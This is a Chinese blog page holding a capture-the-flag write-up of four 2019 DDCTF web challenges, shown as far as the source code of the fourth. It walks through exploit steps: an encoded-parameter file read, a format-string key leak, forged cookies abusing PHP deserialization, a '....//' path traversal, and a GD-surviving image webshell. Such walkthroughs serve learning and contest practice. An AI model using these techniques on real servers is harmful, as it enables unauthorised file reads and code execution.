
<!DOCTYPE html>
<html lang class="loading">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>2019 DDCTF — 线上赛WriteUp - Knlvre</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate">
    <meta name="keywords" content="TriDiamond Obsidian,"> 
    <meta name="description" content="前言首先，本文的涉及到的思路、知识点是实验室成员们共同努力的成果。借鉴学习，我再将比赛中的题目按照自己学到的再做一次，记录下来
Python的Flask简单学习：https://blog.csdn.,"> 
    <meta name="author" content="Knlvre"> 
    <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
    <link rel="icon" href="/knlvre.github.io/img/favicon.ico"> 
    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
    <link rel="stylesheet" href="/knlvre.github.io/css/obsidian.css">
    <link rel="stylesheet" href="/knlvre.github.io/css/ball-atom.min.css">
</head>
</html>

<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">Knlvre</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">2019 DDCTF — 线上赛WriteUp</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="javascript:;" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(/img/cover.jpg);">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
                
                April 18, 2019
            </p>
            <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/04/18/CTF比赛—2019DDCTF线上赛WriteUp/" title="2019 DDCTF — 线上赛WriteUp">2019 DDCTF — 线上赛WriteUp</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>Words count</i>
                    35k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
                    32 mins.
                </span>
                
                
                
                <span id="busuanzi_container_page_pv">
                    <b class="iconfont icon-read"></b> <i>Read count</i>
                    <span id="busuanzi_value_page_pv">0</span>
                </span>
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/CTF比赛/">CTF比赛</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先，本文的涉及到的思路、知识点是实验室成员们共同努力的成果。借鉴学习，我再将比赛中的题目按照自己学到的再做一次，记录下来</p>
<p>Python的Flask简单学习：<a href="https://blog.csdn.net/luanpeng825485697/article/details/80934185" target="_blank" rel="noopener">https://blog.csdn.net/luanpeng825485697/article/details/80934185</a></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol>
<li><a href="https://xz.aliyun.com/t/4862" target="_blank" rel="noopener">https://xz.aliyun.com/t/4862</a></li>
<li><a href="https://www.ctfwp.com/articals/2019ddctf.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019ddctf.html?tdsourcetag=s_pctim_aiomsg</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></li>
<li><a href="https://xz.aliyun.com/t/4849" target="_blank" rel="noopener">https://xz.aliyun.com/t/4849</a></li>
</ol>
<h1 id="1-Web"><a href="#1-Web" class="headerlink" title="1. Web"></a>1. Web</h1><h2 id="第一题（滴-）"><a href="#第一题（滴-）" class="headerlink" title="第一题（滴~）"></a>第一题（滴~）</h2><p>链接进去后，看到<code>jpg</code>参数值后面接着一串<code>Base64</code>密文</p>
<p>解密过程：<code>两次Base64解密，一次Hex转ASCII</code>，解出：<code>flag.jpg</code></p>
<p>flag.jpg正是页面返回的内容之一</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-1.png" alt="1-1"></p>
<p>那我们直接将<code>index.php</code>经过一次ASCII转Hex，两次Base64后，传入参数，并查看网页源代码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-2.png" alt="1-2"></p>
<p>将页面返回的<code>Base64（这是服务器返回给我们的index.php的内容）</code>拿去解密，得到代码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-3.png" alt="1-3"></p>
<p>关注到文章开头的这个<code>hint:https://blog.csdn.net/FengBanLiuYun/article/details/80616607</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-4.png" alt="1-4"></p>
<p>链接进去是博客，看作者<code>2018-07-04</code>这篇博客，按照描述去访问<code>practice.txt.swp</code>文件（记得转换加密）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-5.png" alt="1-5"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-6.png" alt="1-6"></p>
<p>将返回的密文拿去解密得到：<code>f1ag!ddctf.php</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-7.png" alt="1-7"></p>
<p>注意到这里有一个<code>感叹号</code>，并且这个php文件对我们可能有用，要去获取它的内容</p>
<p>但是之前的正则匹配过滤掉除了<code>a-z、A-Z、0-9</code>的所有字符：</p>
<pre><code class="php">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);
</code></pre>
<p>但是他自身的规则又会将<code>config</code>替换成<code>!</code>：</p>
<pre><code class="php">$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);
</code></pre>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-8.png" alt="1-8"></p>
<p>就利用这个规则，将<code>f1ag!ddctf.php</code>改成<code>f1agconfigddctf.php</code>，加密后传入，得到新的内容</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-9.png" alt="1-9"></p>
<p>拿去解密得到：</p>
<pre><code class="php">&lt;?php
include(&#39;config.php&#39;);
$k = &#39;hello&#39;;
extract($_GET);
if(isset($uid))
{
    $content=trim(file_get_contents($k));
    if($uid==$content)
    {
        echo $flag;
    }
    else
    {
        echo&#39;hello&#39;;
    }
}

?&gt;
</code></pre>
<p>那么，<code>file_get_contents(hello)</code>是不是有任何返回的，所有<code>uid=</code>直接不添加参数，<code>url如下</code>：</p>
<pre><code>http://117.51.150.246/f1ag!ddctf.php?uid=
</code></pre><p>直接拿到flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-10.png" alt="1-10"></p>
<h2 id="第二题（WEB签到题）"><a href="#第二题（WEB签到题）" class="headerlink" title="第二题（WEB签到题）"></a>第二题（WEB签到题）</h2><p>访问链接，提示<code>抱歉，您没有登陆权限，请获取权限后访问-----</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-1.png" alt="2-1"></p>
<p>查看源代码，关注到：<code>js/index.js</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-2.png" alt="2-2"></p>
<p>访问一下</p>
<p>在向这个网址：<code>http://117.51.158.44/app/Auth.php</code>发送请求时，头部的<code>didictf_username</code>是空的</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-3.png" alt="2-3"></p>
<p>用<code>Burpsuit</code>向目标网站发起请求，并且添加<code>didictf_username</code>字段，赋值为<code>admin</code>，成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-4.png" alt="2-4"></p>
<p>按照提示访问<code>app\/fL2XID2i0Cdh.php</code>，得到源代码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-5.png" alt="2-5"></p>
<p>接下来就是代码审计了：</p>
<pre><code class="php">url:app/Application.php


Class Application {
    var $path = &#39;&#39;;


    public function response($data, $errMsg = &#39;success&#39;) {
        $ret = [&#39;errMsg&#39; =&gt; $errMsg,
            &#39;data&#39; =&gt; $data];
        $ret = json_encode($ret);
        header(&#39;Content-type: application/json&#39;);
        echo $ret;

    }

    public function auth() {
        $DIDICTF_ADMIN = &#39;admin&#39;;
        if(!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN) {
            $this-&gt;response(&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;);
            return TRUE;
        }else{
            $this-&gt;response(&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;,&#39;error&#39;);
            exit();
        }

    }
    private function sanitizepath($path) {
    $path = trim($path);
    $path=str_replace(&#39;../&#39;,&#39;&#39;,$path);
    $path=str_replace(&#39;..\\&#39;,&#39;&#39;,$path);
    return $path;
}

public function __destruct() {
    if(empty($this-&gt;path)) {
        exit();
    }else{
        $path = $this-&gt;sanitizepath($this-&gt;path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;);
    }
    exit();
}
}

url:app/Session.php
include &#39;Application.php&#39;;
class Session extends Application {

    //key建议为8位字符串
    var $eancrykey                  = &#39;&#39;;
    var $cookie_expiration            = 7200;
    var $cookie_name                = &#39;ddctf_id&#39;;
    var $cookie_path                = &#39;&#39;;
    var $cookie_domain                = &#39;&#39;;
    var $cookie_secure                = FALSE;
    var $activity                   = &quot;DiDiCTF&quot;;

    public function index()
    {
    if(parent::auth()) {
            $this-&gt;get_key();
            if($this-&gt;session_read()) {
                $data = &#39;DiDI Welcome you %s&#39;;
                $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]);
                parent::response($data,&#39;sucess&#39;);
            }else{
                $this-&gt;session_create();
                $data = &#39;DiDI Welcome you&#39;;
                parent::response($data,&#39;sucess&#39;);
            }
        }

    }

    private function get_key() {
        //eancrykey  and flag under the folder
        $this-&gt;eancrykey =  file_get_contents(&#39;../config/key.txt&#39;);
    }

    public function session_read() {
        if(empty($_COOKIE)) {
        return FALSE;
        }

        $session = $_COOKIE[$this-&gt;cookie_name];
        if(!isset($session)) {
            parent::response(&quot;session not found&quot;,&#39;error&#39;);
            return FALSE;
        }
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this-&gt;eancrykey.$session)) {
            parent::response(&quot;the cookie data not match&quot;,&#39;error&#39;);
            return FALSE;
        }
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session[&#39;session_id&#39;]) OR !isset($session[&#39;ip_address&#39;]) OR !isset($session[&#39;user_agent&#39;])){
            return FALSE;
        }

        if(!empty($_POST[&quot;nickname&quot;])) {
            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);
            $data = &quot;Welcome my friend %s&quot;;
            foreach ($arr as $k =&gt; $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,&quot;Welcome&quot;);
        }

        if($session[&#39;ip_address&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) {
            parent::response(&#39;the ip addree not match&#39;.&#39;error&#39;);
            return FALSE;
        }
        if($session[&#39;user_agent&#39;] != $_SERVER[&#39;HTTP_USER_AGENT&#39;]) {
            parent::response(&#39;the user agent not match&#39;,&#39;error&#39;);
            return FALSE;
        }
        return TRUE;

    }

    private function session_create() {
        $sessionid = &#39;&#39;;
        while(strlen($sessionid) &lt; 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $userdata = array(
            &#39;session_id&#39; =&gt; md5(uniqid($sessionid,TRUE)),
            &#39;ip_address&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;],
            &#39;user_agent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;],
            &#39;user_data&#39; =&gt; &#39;&#39;,
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);
        $expire = $this-&gt;cookie_expiration + time();
        setcookie(
            $this-&gt;cookie_name,
            $cookiedata,
            $expire,
            $this-&gt;cookie_path,
            $this-&gt;cookie_domain,
            $this-&gt;cookie_secure
            );

    }
}


$ddctf = new Session();
$ddctf-&gt;index();
</code></pre>
<p>首先创建了一个<code>Session类</code>（Session类继承了Application类），调用了该类的<code>index()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-6.png" alt="2-6"></p>
<p>看一下<code>index()</code>这个方法，调用了<code>parent::auth()</code>，也就是<code>Application类的auth()方法</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-7.png" alt="2-7"></p>
<p>看一下<code>auth()</code>方法，没什么营养，也就是我们前面修改<code>header</code>的步骤</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-8.png" alt="2-8"></p>
<p>接下来看index()方法中调用的<code>get_key()</code>方法</p>
<p>读取了<code>key.txt</code>存入变量<code>eancrykey</code>当中</p>
<p>想直接读取<code>/config/key.txt</code>时，<code>403</code>，被拒绝了，只能继续，可能就是flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-9.png" alt="2-9"></p>
<p>接下来看index()方法中调用的<code>session_read()</code>方法</p>
<p>第一步，如果没有提交<code>Cookie</code>的话，就会返回<code>False</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-10.png" alt="2-10"></p>
<p>那么index()函数就会执行这部分</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-11.png" alt="2-11"></p>
<p>那就再把目光转移到<code>session_create()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-12.png" alt="2-12"></p>
<p><code>mt_rand()</code>会生成一个32位伪随机数的<code>$sessionid</code></p>
<p><code>$sessionid</code>会同其他访问者信息存放在<code>$userdata</code>这个数组内</p>
<p>生成的<code>Cookie</code>重要信息就是：（$userdata的序列化）+（$userdata的序列化+eancrykey之和的md5的值）</p>
<p>根据开头的<code>url</code>变量提示，我们访问<code>app/Session.php</code>（记得最开始的didictf_username字段不要漏了）</p>
<p>访问成功，说明成功执行了<code>session_create()</code>方法，通过<code>response()</code>方法给我们返回了success</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-13.png" alt="2-13"></p>
<p>注意此时<code>Response</code>中服务器给我们返回的我们的<code>Cookie</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-14.png" alt="2-14"></p>
<p><code>url解码</code>一下</p>
<p>的确是我们之前的：（$userdata的序列化）+（$userdata的序列化+eancrykey的md5的值）</p>
<p>直接将后面的md5值拿去在线网站解密一下，没有结果，那就继续吧</p>
<pre><code>a:4:{s:10:&quot;session_id&quot;;s:32:&quot;598fd9af879fcff5e6f1fd754cc731d9&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;140.224.71.170&quot;;s:10:&quot;user_agent&quot;;s:113:&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;}77892297db0f81fbbfcf6d269731b568
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-15.png" alt="2-15"></p>
<p>此时我们的<code>Cookie和Session</code>是已经创建好了的，可以成功执行到<code>session_read()</code>方法，方法内：</p>
<p>一直到这一步，需要我们<code>POST</code>一个值</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-16.png" alt="2-16"></p>
<p>因为<code>$arr</code>数组里面有两个键值对，分别是我们要POST的<code>nickname</code>的值和变量<code>eancrykey</code></p>
<p>利用<code>sprintf</code>循环两次，可是这里就存在一个问题，如果nickname抢占了<code>%s</code>号，第二次循环时将无法将eancrykey的值输出</p>
<p>为了解决这个，我们利用本处的<code>逻辑漏洞</code>：直接令<code>nickname=%s</code>。返回的信息中，得到变量<code>eancrykey</code>的值：<code>EzblrbNS</code></p>
<p><code>注意：此时在POST时，因为我们用的是Burpsuits，所以要手动加上Cookie才可以</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-18.png" alt="2-18"></p>
<p>接下来分析Application的<code>析构函数</code>了，发现它的析构函数会输出文件内容，我们用这个析构函数输出<code>../config/key.txt</code>的内容，前提是path不为空，而且path的长度为18，但发现没有任何赋值代码。</p>
<p><code>子类会继承父类的函数</code>，所以可以直接对Session.php下手：再次分析Session.php，在session_read中有反序列化函数unserialize，利用反序列化漏洞，给path赋值。序列化文本在session_create中生成，最后存储在cookie中，生成方法就是用序列化文本+md5(eancrykey+序列化文本)。</p>
<p>因为Path的长度要求为18，且会用str_replace过滤../，但是str_replace的过滤规则不严谨，所以可以用<code>....//config/flag.txt（类似SQL注入中的双写）</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-17.png" alt="2-17"></p>
<p>生成一个使用Session类、给path赋值<strong>….//config/flag.txt</strong>，然后按照生成方法得到ddctf_id，最后url编码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-19.png" alt="2-19"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-20.png" alt="2-20"></p>
<h2 id="第三题（Upload-IMG）"><a href="#第三题（Upload-IMG）" class="headerlink" title="第三题（Upload-IMG）"></a>第三题（Upload-IMG）</h2><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><ol>
<li><p><a href="https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg" target="_blank" rel="noopener">https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg</a></p>
</li>
<li><p><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p>
</li>
</ol>
<p>先随意上传一张图片，提示我们：<code>上传的图片源代码中未包含指定字符串:phpinfo()</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/3-1.png" alt="3-1"></p>
<p>我们在图片中插入phpinfo，上传之后再现在网页上我们上传的图片，会发现我们插入的phpinfo不见了。猜测后端应该是使用了PHP-GD拓展处理了图片。我们绕过GD拓展，使得图片里面包含phpinfo即可，具体看第一篇参考文章</p>
<p>绕过二次渲染上传图片马：看第二篇参考文章</p>
<p>使用其中生成jpg图片的php脚本，过程为向服务器任意上传一个jpg文件，将上传成功的jpg文件下载下来，命名为1.jpg，再运行脚本，命令为：</p>
<pre><code>php jpg_payload.php 1.jpg
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/3-2.png" alt="3-2"></p>
<p> 在目录下生成加入图片马的jpg图片，我们可以在16进制编辑器打开验证：</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/3-3.png" alt="3-3"></p>
<p>成功插入phpinfo信息，再次在服务器中上传该图片马</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/3-4.png" alt="3-4"></p>
<p>成功获得flag</p>
<p>另外，png的图片同样可以通过参考链接中的其他脚本生成图片马，gif文件则需要比较前后图片的相同之处即imagecreatefromgif函数未修改的部分，比较麻烦一点</p>
<hr>
<h2 id="第四题（homebrew-event-loop）"><a href="#第四题（homebrew-event-loop）" class="headerlink" title="第四题（homebrew event loop）"></a>第四题（homebrew event loop）</h2><p>链接进去</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/4-1.png" alt="4-1"></p>
<p>点击<code>View source code</code>查看源代码：</p>
<pre><code class="python"># -*- encoding: utf-8 -*- 
# written in python 2.7 
__author__ = &#39;garzon&#39; 

from flask import Flask, session, request, Response 
import urllib 

app = Flask(__name__) 
app.secret_key = &#39;*********************&#39; # censored 
url_prefix = &#39;/d5afe1f66147e857&#39; 

def FLAG(): 
    return &#39;FLAG_is_here_but_i_wont_show_you&#39;  # censored 

def trigger_event(event): 
    session[&#39;log&#39;].append(event) 
    if len(session[&#39;log&#39;]) &gt; 5: session[&#39;log&#39;] = session[&#39;log&#39;][-5:] 
    if type(event) == type([]): 
        request.event_queue += event 
    else: 
        request.event_queue.append(event) 

def get_mid_str(haystack, prefix, postfix=None): 
    haystack = haystack[haystack.find(prefix)+len(prefix):] 
    if postfix is not None: 
        haystack = haystack[:haystack.find(postfix)] 
    return haystack 

class RollBackException: pass 

def execute_event_loop(): 
    valid_event_chars = set(&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;) 
    resp = None 
    while len(request.event_queue) &gt; 0: 
        event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; 
        request.event_queue = request.event_queue[1:] 
        if not event.startswith((&#39;action:&#39;, &#39;func:&#39;)): continue 
        for c in event: 
            if c not in valid_event_chars: break 
        else: 
            is_action = event[0] == &#39;a&#39; 
            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;) 
            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;) 
            try: 
                event_handler = eval(action + (&#39;_handler&#39; if is_action else &#39;_function&#39;)) 
                ret_val = event_handler(args) 
            except RollBackException: 
                if resp is None: resp = &#39;&#39; 
                resp += &#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39; 
                resp += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39; 
                session[&#39;num_items&#39;] = request.prev_session[&#39;num_items&#39;] 
                session[&#39;points&#39;] = request.prev_session[&#39;points&#39;] 
                break 
            except Exception, e: 
                if resp is None: resp = &#39;&#39; 
                #resp += str(e) # only for debugging 
                continue 
            if ret_val is not None: 
                if resp is None: resp = ret_val 
                else: resp += ret_val 
    if resp is None or resp == &#39;&#39;: resp = (&#39;404 NOT FOUND&#39;, 404) 
    session.modified = True 
    return resp 

@app.route(url_prefix+&#39;/&#39;) 
def entry_point(): 
    querystring = urllib.unquote(request.query_string) 
    request.event_queue = [] 
    if querystring == &#39;&#39; or (not querystring.startswith(&#39;action:&#39;)) or len(querystring) &gt; 100: 
        querystring = &#39;action:index;False#False&#39; 
    if &#39;num_items&#39; not in session: 
        session[&#39;num_items&#39;] = 0 
        session[&#39;points&#39;] = 3 
        session[&#39;log&#39;] = [] 
    request.prev_session = dict(session) 
    trigger_event(querystring) 
    return execute_event_loop() 

# handlers/functions below -------------------------------------- 

def view_handler(args): 
    page = args[0] 
    html = &#39;&#39; 
    html += &#39;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&#39;.format(session[&#39;num_items&#39;], session[&#39;points&#39;]) 
    if page == &#39;index&#39;: 
        html += &#39;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#39; 
        html += &#39;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#39; 
        html += &#39;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#39; 
    elif page == &#39;shop&#39;: 
        html += &#39;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#39; 
    elif page == &#39;reset&#39;: 
        del session[&#39;num_items&#39;] 
        html += &#39;Session reset.&lt;br /&gt;&#39; 
    html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39; 
    return html 

def index_handler(args): 
    bool_show_source = str(args[0]) 
    bool_download_source = str(args[1]) 
    if bool_show_source == &#39;True&#39;: 

        source = open(&#39;eventLoop.py&#39;, &#39;r&#39;) 
        html = &#39;&#39; 
        if bool_download_source != &#39;True&#39;: 
            html += &#39;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#39; 
            html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39; 

        for line in source: 
            if bool_download_source != &#39;True&#39;: 
                html += line.replace(&#39;&amp;&#39;,&#39;&amp;amp;&#39;).replace(&#39;\t&#39;, &#39;&amp;nbsp;&#39;*4).replace(&#39; &#39;,&#39;&amp;nbsp;&#39;).replace(&#39;&lt;&#39;, &#39;&amp;lt;&#39;).replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;).replace(&#39;\n&#39;, &#39;&lt;br /&gt;&#39;) 
            else: 
                html += line 
        source.close() 

        if bool_download_source == &#39;True&#39;: 
            headers = {} 
            headers[&#39;Content-Type&#39;] = &#39;text/plain&#39; 
            headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=serve.py&#39; 
            return Response(html, headers=headers) 
        else: 
            return html 
    else: 
        trigger_event(&#39;action:view;index&#39;) 

def buy_handler(args): 
    num_items = int(args[0]) 
    if num_items &lt;= 0: return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0]) 
    session[&#39;num_items&#39;] += num_items  
    trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;]) 

def consume_point_function(args): 
    point_to_consume = int(args[0]) 
    if session[&#39;points&#39;] &lt; point_to_consume: raise RollBackException() 
    session[&#39;points&#39;] -= point_to_consume 

def show_flag_function(args): 
    flag = args[0] 
    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. 
    return &#39;You naughty boy! ;) &lt;br /&gt;&#39; 

def get_flag_handler(args): 
    if session[&#39;num_items&#39;] &gt;= 5: 
        trigger_event(&#39;func:show_flag;&#39; + FLAG()) # show_flag_function has been disabled, no worries 
    trigger_event(&#39;action:view;index&#39;) 

if __name__ == &#39;__main__&#39;: 
    app.run(debug=False, host=&#39;0.0.0.0&#39;) 
</code></pre>
<p>每个函数的简单介绍：</p>
<pre><code class="python">#==========================================================
# flag获取函数
def FLAG()

# 以下三个函数负责对参数进行解析。
# 1. 添加log，并将参数加入队列
def trigger_event(event)

# 2. 工具函数，获取prefix与postfix之间的值
def get_mid_str(haystack, prefix, postfix=None):

# 3. 从队列中取出函数，并分析后，进行执行。（稍后进行详细分析）
def execute_event_loop()
#==========================================================
# 网站入口点
def entry_point()

# 页面渲染，三个页面:index/shop/reset
def view_handler()

# 下载源码
def index_handler(args)

# 增加钻石
def buy_handler(args)

# 计算价钱，进行减钱
def consume_point_function(args)
#==========================================================
# 输出flag
def show_flag_function(args)
def get_flag_handler(args)
</code></pre>
